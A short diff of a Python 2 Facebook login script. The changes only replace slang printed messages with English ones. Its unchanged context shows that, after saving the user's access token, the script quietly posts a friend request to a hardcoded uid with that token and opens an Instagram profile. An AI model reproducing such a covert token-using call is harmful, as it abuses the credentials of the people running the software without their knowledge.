@@ -182,7 +182,7 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;36;40m[✓] Ha hogi login Mamu...'
+				print '\n\x1b[1;36;40m[✓] successful login...'
 				os.system('xdg-open https://https://www.instagram.com/zero_xvip')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
@@ -221,12 +221,12 @@ def menu():
 		sub = str(b['summary']['total_count'])
 	except KeyError:
 		os.system('clear')
-		print"\033[1;91mTera Account thik ni o knjra"
+		print"\033[1;91mAccount checkpoint"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
-		print"\x1b[1;92mThere is no internet connection"
+		print"\x1b[1;92mNo connection"
 		keluar()
 	os.system("clear")
 	print logo
